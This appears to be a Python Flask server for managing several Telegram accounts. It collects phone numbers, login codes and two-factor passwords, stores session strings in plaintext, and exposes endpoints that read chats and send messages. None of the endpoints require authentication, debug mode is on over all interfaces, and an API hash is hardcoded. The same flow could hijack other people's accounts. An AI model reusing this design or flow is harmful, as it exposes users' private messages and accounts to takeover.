from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
import json
import os
import asyncio
import logging

# Simple logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Simple storage
accounts = []  # All accounts stored here
temp_sessions = {}  # Temporary for OTP
ACCOUNTS_FILE = 'accounts.json'

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                accounts = json.load(f)
            logger.info(f"Loaded {len(accounts)} accounts")
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
    except:
        accounts = []

# Save accounts to file
def save_accounts():
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)

# Run async function
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

# Load accounts on start
load_accounts()

# -------------------- PAGES --------------------
@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

# -------------------- API --------------------

# Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    return jsonify({
        'success': True, 
        'accounts': [{
            'id': a['id'],
            'phone': a.get('phone', ''),
            'name': a.get('name', 'Unknown')
        } for a in accounts]
    })

# Send OTP
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash,
            'session': client.session.save()
        }
    
    try:
        result = run_async(send_code())
        session_id = str(len(temp_sessions))
        temp_sessions[session_id] = {
            'phone': phone,
            'hash': result['phone_code_hash'],
            'session': result['session']
        }
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Verify code
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH)
        await client.connect()
        
        if password:
            await client.sign_in(password=password)
        else:
            await client.sign_in(session['phone'], code, phone_code_hash=session['hash'])
        
        me = await client.get_me()
        return {
            'success': True,
            'id': me.id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or session['phone'],
            'phone': me.phone or session['phone'],
            'session': client.session.save()
        }
    
    try:
        result = run_async(verify())
        
        # Save account
        new_id = 1
        if accounts:
            new_id = max([a['id'] for a in accounts]) + 1
        
        accounts.append({
            'id': new_id,
            'phone': result['phone'],
            'name': result['name'],
            'session': result['session']
        })
        save_accounts()
        
        del temp_sessions[session_id]
        return jsonify({'success': True})
        
    except errors.SessionPasswordNeededError:
        return jsonify({'success': False, 'need_password': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Get chats and messages
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    # Find account
    account = None
    for a in accounts:
        if a['id'] == account_id:
            account = a
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        dialogs = await client.get_dialogs(limit=100)
        
        chats = []
        all_messages = []
        
        for dialog in dialogs:
            # Get chat type
            if dialog.is_user:
                if dialog.entity and hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                    chat_type = 'bot'
                else:
                    chat_type = 'user'
            elif dialog.is_group:
                chat_type = 'group'
            elif dialog.is_channel:
                chat_type = 'channel'
            else:
                chat_type = 'user'
            
            # Get name
            name = dialog.name or 'Unknown'
            
            # Get last message
            last_msg = ''
            last_date = 0
            if dialog.message:
                if dialog.message.text:
                    last_msg = dialog.message.text[:50]
                elif dialog.message.media:
                    last_msg = '📎 Media'
                if dialog.message.date:
                    last_date = int(dialog.message.date.timestamp())
            
            chats.append({
                'id': str(dialog.id),
                'title': name,
                'type': chat_type,
                'unread': dialog.unread_count or 0,
                'lastMessage': last_msg,
                'lastMessageDate': last_date
            })
            
            # Get recent messages
            try:
                msgs = await client.get_messages(dialog.entity, limit=10)
                for msg in msgs:
                    if not msg:
                        continue
                    
                    msg_text = msg.text or ''
                    media_type = None
                    
                    if msg.media:
                        if isinstance(msg.media, MessageMediaPhoto):
                            media_type = 'photo'
                            msg_text = '📷 Photo'
                        elif isinstance(msg.media, MessageMediaDocument):
                            media_type = 'document'
                            msg_text = '📎 Document'
                        else:
                            media_type = 'media'
                            msg_text = '📎 Media'
                    
                    all_messages.append({
                        'chatId': str(dialog.id),
                        'text': msg_text,
                        'date': int(msg.date.timestamp()) if msg.date else 0,
                        'out': msg.out or False,
                        'id': msg.id,
                        'hasMedia': msg.media is not None,
                        'mediaType': media_type
                    })
            except:
                continue
        
        await client.disconnect()
        return {'chats': chats, 'messages': all_messages}
    
    try:
        result = run_async(fetch())
        return jsonify({
            'success': True,
            'chats': result['chats'],
            'messages': result['messages']
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    # Find account
    account = None
    for a in accounts:
        if a['id'] == account_id:
            account = a
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            entity = await client.get_entity(int(chat_id))
            await client.send_message(entity, message)
        except:
            entity = await client.get_entity(chat_id)
            await client.send_message(entity, message)
        
        await client.disconnect()
        return True
    
    try:
        run_async(send())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    global accounts
    accounts = [a for a in accounts if a['id'] != account_id]
    save_accounts()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('SIMPLE TELEGRAM MANAGER')
    print('='*50)
    print(f'Accounts loaded: {len(accounts)}')
    print(f'Server running on port {port}')
    print('='*50)
    app.run(host='0.0.0.0', port=port, debug=True)
